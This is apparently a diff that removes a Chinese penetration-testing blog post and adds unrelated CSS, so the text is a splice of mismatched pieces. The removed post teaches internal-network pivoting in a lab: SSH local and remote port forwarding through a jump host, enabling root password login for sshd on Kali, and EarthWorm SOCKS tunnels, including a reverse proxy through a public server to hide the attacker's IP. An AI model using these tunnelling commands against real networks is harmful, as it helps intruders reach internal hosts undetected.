-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240414171623552.png">
-
-<h4 id="ssh-本地端口转发"><a href="#ssh-本地端口转发" class="headerlink" title="ssh 本地端口转发"></a>ssh 本地端口转发</h4><p>ssh 本地端口转发命令的「-L」旗标后可以填写四个参数，完整格式为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L [收听接口:]收听端口:目标主机:目标端口 username@hostname</span><br></pre></td></tr></table></figure>
-
-<p>命令中方括号内的部分，即第一个参数可以不写；它的默认值一般是 0.0.0.0（OpenSSH 客户端配置文件「ssh_config」中「GatewayPorts」选项的值一般为「yes」），意味着 SSH 隧道会收听所有接口，接受来自任何地址的应用访问请求并进行转发。</p>
-<p>执行此命令后，将能够在收听端口处访问目标主机的目标端口。</p>
-<p>比如，以 192.168.43.13 为跳板机，将 192.168.52.143 内网主机的 80 端口转发到本机的 8879 端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 8879:192.168.52.143:80 Administrator@192.168.43.13</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><code>-C</code>：这个选项表示启用压缩。SSH 将会压缩数据包数据，这可以提高传输效率，特别是在带宽较低的情况下。压缩可以减少传输的数据量，从而加快数据传输速度，并可能降低网络延迟。</li>
-<li><code>-f</code>：这个选项表示 SSH 客户端在创建隧道后进入后台运行。这意味着一旦隧道建立，SSH 客户端不会占用终端，允许用户继续在同一个终端上执行其他任务。这对于需要长时间运行的隧道特别有用。</li>
-<li><code>-N</code>：这个选项表示如果 SSH 检测到隧道没有数据传输，它不会关闭隧道。通常，SSH 会关闭空闲的隧道以节省资源，但使用 <code>-N</code> 选项后，即使没有数据流动，隧道也会保持开启状态。</li>
-<li><code>-g</code>：这个选项允许 SSH 绑定到非本地地址。默认情况下，SSH 只能绑定到本地地址，但使用 <code>-g</code> 选项后，可以指定一个非本地的端口进行监听。这对于需要从远程网络访问本地服务的情况非常有用。</li>
-</ol>
-<p>那么此时访问本机的 8879 端口就可以访问到内网主机 192.168.52.143 的 80 端口了。</p>
-<p>上述命令在 kali 上执行，因此称为本地转发。</p>
-<h4 id="kali-开启-sshd-服务"><a href="#kali-开启-sshd-服务" class="headerlink" title="kali 开启 sshd 服务"></a>kali 开启 sshd 服务</h4><p><strong>一、配置 SSH 参数</strong></p>
-<p>修改 sshd_config 文件，命令为：<code>vi /etc/ssh/sshd_config</code> 。</p>
-<p>将 #PasswordAuthentication no 的注释去掉，并且将 NO 修改为 YES &#x2F;&#x2F; kali 中默认是 yes ；</p>
-<p>将 #PermitRootLogin without-password 修改为 PermitRootLogin yes ；</p>
-<p>然后保存退出 vi 编辑器。</p>
-<p><strong>二、启动 SSH 服务</strong> </p>
-<p>启动 SSH 服务，命令为： <code>/etc/init.d/ssh start</code> </p>
-<p>或者： <code>service ssh start</code> </p>
-<p>查看 SSH 服务状态是否正常运行，命令为： <code>/etc/init.d/ssh status</code> </p>
-<p>或者： <code>service ssh status</code> </p>
-<p>注明：这两种启动 ssh 方式都是临时性的，如果机器重启就需要重新输入上面命令才可以开启 ssh ，如果需要 ssh 服务下次开机自动启动，则需要使用以下命令启动 ssh 服务，命令为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d ssh enable // 系统自动启动SSH服务</span><br><span class="line">update-rc.d ssh disabled // 关闭系统自动启动SSH服务</span><br></pre></td></tr></table></figure>
-
-<p><strong>三、关闭 ssh 服务</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service sshd stop</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h4><p>在 Windows server 2019 上执行以下命令用 ssh 连接 kali ，这里的 192.168.52.143 仍然是内网主机，但最后是 kali 的用户名和 IP ：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3333:192.168.52.143:80 root@192.168.43.173</span><br></pre></td></tr></table></figure>
-
-<p>这样做的前提是 kali 要启动 sshd 服务。完成上述操作后，在 kali 上访问 127.0.0.1:3333 即可访问到 192.168.52.143:80 。</p>
-<h3 id="EarthWorm-工具的使用"><a href="#EarthWorm-工具的使用" class="headerlink" title="EarthWorm 工具的使用"></a>EarthWorm 工具的使用</h3><p>EW（Earthworm）是一套便携式的网络穿透工具，具有 SOCKS v5 服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以 “正向” 、“反向” 、“多级级联” 等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内，强烈推荐使用。</p>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/mrawb/ew/tree/master">https://github.com/mrawb/ew/tree/master</a></p>
-<p><strong>EW 的使用方法</strong> </p>
-<p>该工具共有 6 种命令格式（ <code>ssocksd</code> 、<code>rcsocks</code> 、<code>rssocks</code> 、<code>lcx_slave</code> 、<code>lcx_listen</code> 、<code>lcx_tran</code> ）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 1080       //开启正向socks服务</span><br><span class="line"></span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888  //监听1080端口，1080接收的数据通过8888交互传递</span><br><span class="line"></span><br><span class="line">./ew -s rssocks -d rev_ip -e 8888 //开启反向socks服务。反向连接rev_ip的8888端口</span><br><span class="line"></span><br><span class="line">./ew -s lcx_listen -l 1080 -e 8888  //监听1080端口，1080接收的数据通过8888交互传递</span><br><span class="line"></span><br><span class="line">./ew -s lcx_tran -l 1080 -f forward_ip -g8888 //监听1080端口，1080接收的数据正向传给forward_ip的8888端口</span><br><span class="line"></span><br><span class="line">./ew -s lcx_slave -d vps_ip -e 8888 -f B_ip-g 9999 //作为中间角色，反向连接vps的8888，正向连接B的9999。打通两者</span><br></pre></td></tr></table></figure>
-
-<p>注意，这里的 .&#x2F;ew 是指 ew-master 目录下的任意一个可执行文件，根据对应的操作系统选择一个。</p>
-<h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>在 Windows Server 2019 上运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
-
-<p>此时将 kali 的代理设置为 <code>Windows Server 2019 的 IP + 端口 1080</code> 即可访问内网中的其他机器。</p>
-<h4 id="反弹代理"><a href="#反弹代理" class="headerlink" title="反弹代理"></a>反弹代理</h4><p>原理就是让 Windows Server 2019 主动去连接一台公网服务器，然后攻击者把这台公网服务器当代理，就可以访问内网了。</p>
-<p>当然也可以直接让 Windows Server 2019 主动去连接 kali 攻击机，但是使用上一种方法可以隐藏 kali IP。</p>
-<p>在一台 Ubuntu 公网服务器上执行监听：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 8080 -e 8888</span><br></pre></td></tr></table></figure>
-
-<p>那么此时这台公网服务器就会监听 8080 端口，并将 8080 端口接收的数据通过 8888 端口交互传递。简单点说，就是 kali 在设置代理的时候要设置 <code>公网服务器 IP + 8080 端口</code> ，而 Windows Server 2019 则需要主动去连接这台公网服务器的 8888 端口。</p>
-<p>如果没有执行权限的话需要赋予执行权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ew_for_linux64</span><br></pre></td></tr></table></figure>
-
-<p>在 Windows Server 2019 上执行以下命令与公网服务器建立连接：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_Win.exe -s rssocks -d 公网服务器IP -e 8888</span><br></pre></td></tr></table></figure>
-
-<p>此时在 kali 上配置代理为 <code>公网服务器 IP + 8080 端口</code> 即可访问内网。</p>
-<p>不过因为不明原因，本次实验失败，报错：代理服务器拒绝连接。</p>
-
-
-</article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/05/27/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC3%E9%93%BE%E5%88%86%E6%9E%90/">漏洞篇 - Java 反序列化之 CC3 链</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/05/16/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F02-%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F/">内网渗透 02 - 端口扫描</a></div></section></div>
-
-
-
-
-
-
-<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">妙尽璇机</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8">Stellar 1.26.8</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
-</div></footer>
-<div class='float-panel mobile-only blur' style='display:none'>
-  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
-    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
-  </button>
-</div>
-<div class="main-mask" onclick="sidebar.toggle()"></div></div></div><div class="scripts">
-<script type="text/javascript">
-  const stellar = {
-    // 懒加载 css https://github.com/filamentgroup/loadCSS
-    loadCSS: (href, before, media, attributes) => {
-      var doc = window.document;
-      var ss = doc.createElement("link");
-      var ref;
-      if (before) {
-        ref = before;
-      } else {
-        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
-        ref = refs[refs.length - 1];
-      }
-      var sheets = doc.styleSheets;
-      if (attributes) {
-        for (var attributeName in attributes) {
-          if (attributes.hasOwnProperty(attributeName)) {
-            ss.setAttribute(attributeName, attributes[attributeName]);
-          }
-        }
-      }
-      ss.rel = "stylesheet";
-      ss.href = href;
-      ss.media = "only x";
-      function ready(cb) {
-        if (doc.body) {
-          return cb();
-        }
-        setTimeout(function () {
-          ready(cb);
-        });
-      }
-      ready(function () {
-        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
-      });
-      var onloadcssdefined = function (cb) {
-        var resolvedHref = ss.href;
-        var i = sheets.length;
-        while (i--) {
-          if (sheets[i].href === resolvedHref) {
-            return cb();
-          }
-        }
-        setTimeout(function () {
-          onloadcssdefined(cb);
-        });
-      };
-      function loadCB() {
-        if (ss.addEventListener) {
-          ss.removeEventListener("load", loadCB);
-        }
-        ss.media = media || "all";
-      }
-      if (ss.addEventListener) {
-        ss.addEventListener("load", loadCB);
-      }
-      ss.onloadcssdefined = onloadcssdefined;
-      onloadcssdefined(loadCB);
-      return ss;
-    },
-
-    // 从 butterfly 和 volantis 获得灵感
-    loadScript: (src, opt) => new Promise((resolve, reject) => {
-      var script = document.createElement('script');
-      if (src.startsWith('/')){
-        src = stellar.config.root + src.substring(1);
-      }
-      script.src = src;
-      if (opt) {
-        for (let key of Object.keys(opt)) {
-          script[key] = opt[key]
-        }
-      } else {
-        // 默认异步，如果需要同步，第二个参数传入 {} 即可
-        script.async = true
-      }
-      script.onerror = reject
-      script.onload = script.onreadystatechange = function() {
-        const loadState = this.readyState
-        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-        script.onload = script.onreadystatechange = null
-        resolve()
-      }
-      document.head.appendChild(script)
-    }),
-
-    // https://github.com/jerryc127/hexo-theme-butterfly
-    jQuery: (fn) => {
-      if (typeof jQuery === 'undefined') {
-        stellar.loadScript(stellar.plugins.jQuery).then(fn)
-      } else {
-        fn()
-      }
-    }
-  };
-  stellar.version = '1.26.8';
-  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8';
-  stellar.config = {
-    date_suffix: {
-      just: '刚刚',
-      min: '分钟前',
-      hour: '小时前',
-      day: '天前',
-      month: '个月前',
-    },
-    root : '/',
-  };
-
-  // required plugins (only load if needs)
-  stellar.plugins = {
-    jQuery: 'https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js'
-  };
-
-  if ('local_search') {
-    stellar.search = {};
-    stellar.search.service = 'local_search';
-    if (stellar.search.service == 'local_search') {
-      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"sort":"-date"});
-      stellar.search[stellar.search.service] = service_obj;
-    }
+.l_body {
+  display: flex;
+  margin: auto;
+  padding: 0 var(--gap-l);
+  justify-content: center;
+  font-size: var(--fsp);
+}
+.l_body .l_left {
+  z-index: 8;
+  width: var(--width-left);
+  flex-shrink: 0;
+  position: sticky;
+  position: -webkit-sticky;
+  top: 8px;
+}
+.l_body .l_main {
+  flex-shrink: 1;
+  flex-grow: 1;
+  width: 320px;
+  max-width: var(--width-main);
+}
+.main-mask {
+  position: fixed;
+  pointer-events: none;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.2);
+  z-index: 9;
+  opacity: 0;
+  trans1: opacity;
+}
+@media screen and (max-width: $device-mobile-max) {
+  .mobile-only {
+    display: block !important;
   }
-
-  // stellar js
-  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js","marked":"/js/plugins/marked.js"});
-
-  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
-  // optional plugins
-  if ('true' == 'true') {
-    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js","transition":"fade"});
+  .l_body {
+    padding: 0;
   }
-  if ('true' == 'true') {
-    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  .l_body .l_left {
+    position: fixed;
+    transform: translateX(-320px);
+    margin: 0;
+    left: 8px;
+    box-shadow: $boxshadow-card-float;
+    z-index: 10;
   }
-  if ('' == 'true') {
-    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.bootcdn.net/ajax/libs/scrollReveal.js/4.0.9/scrollreveal.min.js","distance":"16px","duration":800,"interval":100,"scale":1});
+  .l_body .l_main {
+    max-width: 100%;
   }
-  if ('true' == 'true') {
-    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","flying_pages":"https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"});
+  .l_body.mobile .l_left {
+    transition: transform 0.38s ease-out;
   }
-  if ('true' == 'true') {
-    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js","css":"https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css","selector":null});
+  .l_body.mobile.sidebar .l_left {
+    transform: translateX(0px);
   }
-  if ('false' == 'true') {
-    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  .l_body.mobile.sidebar .main-mask {
+    opacity: 1;
+    pointer-events: inherit;
   }
-  if ('true' == 'true') {
-    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
-  }
-</script>
-
-<!-- required -->
-<script src="/js/main.js?v=1.26.8" async></script>
-
-<!-- optional -->
-
-
-
-
-
-
-<!-- inject -->
-<script type="text/javascript" src="/custom/js/ZYCode.js"></script>
-</div></body></html>
+}
